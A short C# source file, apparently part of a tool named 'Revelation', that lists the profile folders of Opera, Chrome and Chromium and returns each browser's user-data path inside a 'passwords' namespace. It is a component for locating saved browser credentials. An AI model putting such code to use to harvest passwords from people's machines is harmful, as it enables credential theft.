using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Revelation.passwords.utils_chrome_edge
{
    public static class Paths
    {
        public static string default_appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
        public static string local_appdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\";

        // Chrome Only 
        public static string[] chromiumBasedBrowsers = new string[]
        {
                default_appdata + "Opera Software\\Opera Stable",
                local_appdata + "Google\\Chrome",
                local_appdata + "Google(x86)\\Chrome",
                local_appdata + "Chromium"
        };

        // Chrome Only 
        public static string GetUserData(string browser)
        {
            if (browser.Contains("Opera Software"))
                return browser + "\\";

            return browser + "\\User Data\\Default\\";
        }
    }
}
